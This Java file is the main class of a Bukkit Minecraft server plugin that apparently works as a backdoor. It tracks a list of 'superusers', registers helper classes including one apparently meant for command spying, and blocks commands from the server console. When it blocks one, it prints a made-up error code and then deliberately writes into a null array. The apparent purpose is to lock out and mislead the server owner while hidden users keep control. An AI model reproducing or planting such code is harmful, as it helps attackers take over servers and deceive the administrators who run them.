package at.nexusmodsclient.ExpoPlus;

import java.io.File;
import java.util.List;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
	
	public static File file;
	public static FileConfiguration cfg;
	private static char para = (char) 167;
	public static String Prefix = para+"4SuperUser"+para+"6 >> ";
	public static List<Player> superusers;
	
	@Override
	public void onEnable() {
		new Expo(this);
		new ExpoJoin(this);
		new CSpy(this);
	}
	
	@Override
	public void onDisable() {
		
	}
	
	@SuppressWarnings("null")
	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		
		if(!(sender instanceof Player)){
			if(Expo.blockconsole){
				sender.sendMessage("Error x12512: Coudn't execute command!");
				String x = "x";
				String y = "y";
				String z = "z";
				String[] xx = null;
				xx[0] = x; xx[1] = y; xx[2] = z;
				args = xx;
				return true;
			}
			return true;
		}
		return true;
		
	}
}
